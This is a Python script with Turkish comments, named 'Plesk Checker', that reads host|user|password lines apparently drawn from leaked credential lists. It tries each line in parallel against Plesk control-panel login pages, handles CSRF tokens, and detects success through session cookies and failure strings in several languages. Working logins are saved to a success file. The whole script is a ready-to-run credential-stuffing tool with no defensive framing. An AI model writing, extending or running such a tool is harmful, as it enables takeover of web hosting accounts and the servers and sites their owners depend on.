#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Plesk panel giriş denemesi — cpanel.py ile aynı genel akış.
Girdi: ulp_plesk.txt (varsayılan) — satır başına https://host:8443|kullanici|parola
       veya host:8443/path:kullanici:parola biçimi.
"""
from __future__ import annotations

import argparse
import re
import signal
import sys
import threading
import time
from concurrent.futures import ThreadPoolExecutor
from pathlib import Path

import requests
from colorama import Fore, Style, init
from termcolor import colored

requests.urllib3.disable_warnings()
init(autoreset=True)

PLESK_CHECKER_VERSION = "1.1"
pause_event = threading.Event()
pause_event.set()

_write_lock = threading.Lock()

# Plesk tipik portları (satır içi tarama)
_PLESK_PORT = re.compile(r":(8443|8880)(?=[/:]|$|:)", re.IGNORECASE)
_CSRF_RE = re.compile(r'name="csrftoken"\s+value="([^"]+)"', re.I)
_CSRF_RE2 = re.compile(r"csrftoken\s+value='([^']+)'", re.I)

# Yanlış giriş / hata — İngilizce, Portekizce, Almanca (küçük harf aranır)
_FAIL_MARKERS = (
    "incorrect user",
    "incorrect password",
    "incorrect username",
    "wrong user",
    "wrong password",
    "invalid login",
    "login failed",
    "authentication failed",
    "could not log",
    "couldn't log",
    "incorret",  # PT/ES varyantları
    "incorrectamente",
    "digitou nome",
    "nome de usuário ou senha",
    "usuário ou senha",
    "senha incorret",
    "usuario ou senha",
    "erro:",
    "anmeldefehler",
    "fehler bei der anmeldung",
    "anmeldung fehlgeschlagen",
    "zugriff verweigert",
    "try again",
    "class=\"msg-error\"",
    "msg-error",
)


def print_banner() -> None:
    print(colored("Plesk Checker", "cyan", attrs=["bold"]))
    print(colored(f"Sürüm: {PLESK_CHECKER_VERSION}", "yellow"))


def _strip_scheme(s: str) -> str:
    low = s.lower()
    if low.startswith("https://"):
        return s[8:]
    if low.startswith("http://"):
        return s[7:]
    return s


def _split_user_pass_after_port(work: str, port_end: int) -> tuple[str, str]:
    suffix = work[port_end:]
    if not suffix:
        return "", ""
    if suffix.startswith("/"):
        parts = suffix.rsplit(":", 2)
        if len(parts) == 3:
            return parts[1], parts[2]
        if len(parts) == 2:
            return parts[1], ""
        return "", ""
    if suffix.startswith(":"):
        tail = suffix[1:]
        if ":" in tail:
            u, p = tail.rsplit(":", 1)
            return u, p
        return tail, ""
    return "", ""


def _parse_colon_ulp(s: str) -> tuple[str, str, str] | None:
    work = _strip_scheme(s)
    m = _PLESK_PORT.search(work)
    if not m:
        return None
    host = work[: m.start()]
    port = m.group(1)
    scheme = "http" if port == "8880" else "https"
    base = f"{scheme}://{host}:{port}"
    user, pw = _split_user_pass_after_port(work, m.end())
    if not user or not pw:
        return None
    return base.rstrip("/"), user, pw


def parse_line(line: str) -> tuple[str, str, str] | None:
    s = line.strip()
    if not s or s.startswith("#"):
        return None
    if s.count("|") >= 2:
        url, user, pw = [p.strip() for p in s.split("|", 2)]
        if not url or not user or not pw:
            return None
        url = url.rstrip("/")
        low = url.lower()
        if not low.startswith("http"):
            url = "https://" + url.lstrip("/")
        if ":8880" in url and url.lower().startswith("https://"):
            url = "http://" + url[8:]
        return url, user, pw
    return _parse_colon_ulp(s)


def _extract_csrf(html: str) -> str | None:
    for rx in (_CSRF_RE, _CSRF_RE2):
        mo = rx.search(html)
        if mo:
            return mo.group(1)
    return None


def _body_suggests_login_form(html: str) -> bool:
    low = html.lower()
    return ('name="login_name"' in low or "name='login_name'" in low) and (
        'name="passwd"' in low or "name='passwd'" in low or 'type="password"' in low
    )


def _body_suggests_failure(html: str) -> bool:
    t = html.lower()
    return any(m in t for m in _FAIL_MARKERS)


def _has_plesk_session_cookie(session: requests.Session) -> bool:
    for c in session.cookies:
        if c.name.upper() in ("PLESKSESSID", "PLESKSESSION"):
            return bool(c.value and len(c.value) > 4)
    return False


def _login_succeeded(p: requests.Response, session: requests.Session) -> bool:
    """POST sonrası gerçekten oturum açılmış mı — gevşek pozitifleri engeller."""
    url = (p.url or "").lower()
    body = p.text or ""

    if _body_suggests_failure(body):
        return False

    if "/smb/" in url and "login_up" not in url:
        if not _body_suggests_login_form(body):
            return True

    if "login_up" in url:
        return False

    if _has_plesk_session_cookie(session) and not _body_suggests_login_form(body):
        return True

    return False


def try_plesk_login(base: str, username: str, password: str, output_file: str) -> None:
    while not pause_event.is_set():
        time.sleep(0.1)

    base = base.rstrip("/")
    s = requests.Session()
    s.verify = False
    s.headers.update({"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 PleskChecker/1.1"})

    try:
        login_candidates = (
            f"{base}/login_up.php3",
            f"{base}/login_up.php",
        )
        g: requests.Response | None = None
        post_url = f"{base}/login_up.php"
        csrftoken: str | None = None

        for u in login_candidates:
            try:
                cand = s.get(u, timeout=20, allow_redirects=True)
            except requests.RequestException:
                continue
            if cand.status_code == 200 and cand.text:
                g = cand
                post_url = cand.url.split("?")[0]
                csrftoken = _extract_csrf(cand.text)
                if "login_name" in cand.text.lower() or "login_up" in cand.url.lower():
                    break

        if g is None or g.status_code != 200:
            raise RuntimeError("login page")

        data: dict[str, str] = {"login_name": username, "passwd": password}
        if csrftoken:
            data["csrftoken"] = csrftoken

        p = s.post(post_url, data=data, timeout=25, allow_redirects=True)

        if _login_succeeded(p, s):
            print(Fore.GREEN + f"[SUCCESS LOGIN] --> {base}")
            line = f"{base}|{username}|{password}\n"
            with _write_lock:
                with open(output_file, "a", encoding="utf-8") as fh:
                    fh.write(line)
        else:
            print(Fore.RED + f"[FAILED LOGIN] --> {base}")
    except Exception:
        print(Fore.RED + f"[FAILED LOGIN] --> {base}")
    finally:
        s.close()
        time.sleep(0.05)


def _dedupe_records(records: list[tuple[str, str, str]]) -> list[tuple[str, str, str]]:
    seen: set[tuple[str, str, str]] = set()
    out: list[tuple[str, str, str]] = []
    for r in records:
        if r not in seen:
            seen.add(r)
            out.append(r)
    return out


def handle_ctrl_c(signum, frame) -> None:
    global pause_event
    pause_event.clear()
    print(Fore.YELLOW + "\nCTRL+C algılandı!")
    while True:
        choice = input(Fore.CYAN + Style.BRIGHT + "[e]xit veya [r]esume? ").strip().lower()
        if choice == "e":
            print(Fore.RED + "Çıkılıyor...")
            sys.exit(0)
        if choice == "r":
            print(Fore.GREEN + "Devam...")
            pause_event.set()
            break
        print(Fore.YELLOW + "Geçersiz seçim.")


def main() -> int:
    ap = argparse.ArgumentParser(
        description="Plesk giriş denemesi (ulp_plesk biçimi).",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter,
    )
    ap.add_argument(
        "-f",
        "--file",
        default=str(Path(__file__).resolve().parent / "ulp_plesk.txt"),
        help="Girdi listesi (| veya host:8443:... satırları)",
    )
    ap.add_argument("-o", default=None, help="Başarılı satırların yazılacağı dosya")
    ap.add_argument("--threads", type=int, default=10, help="Eşzamanlı iş parçacığı")
    ap.add_argument(
        "--append",
        action="store_true",
        help="Çıktı dosyasına ekle (varsayılan: her çalıştırmada dosyayı sıfırlar)",
    )
    args = ap.parse_args()

    input_file = args.file
    output_file = args.o or f"{input_file}_success.txt"

    try:
        with open(input_file, "r", encoding="utf-8", errors="replace") as f:
            records: list[tuple[str, str, str]] = []
            for line in f:
                rec = parse_line(line)
                if rec:
                    records.append(rec)
    except FileNotFoundError:
        print(Fore.RED + f"Dosya bulunamadı: {input_file}")
        return 1

    records = _dedupe_records(records)

    if not args.append:
        try:
            with open(output_file, "w", encoding="utf-8") as fh:
                fh.write("")
        except OSError:
            pass

    print_banner()
    signal.signal(signal.SIGINT, handle_ctrl_c)

    with ThreadPoolExecutor(max_workers=args.threads) as ex:
        for base, user, pw in records:
            ex.submit(try_plesk_login, base, user, pw, output_file)

    return 0


if __name__ == "__main__":
    raise SystemExit(main())
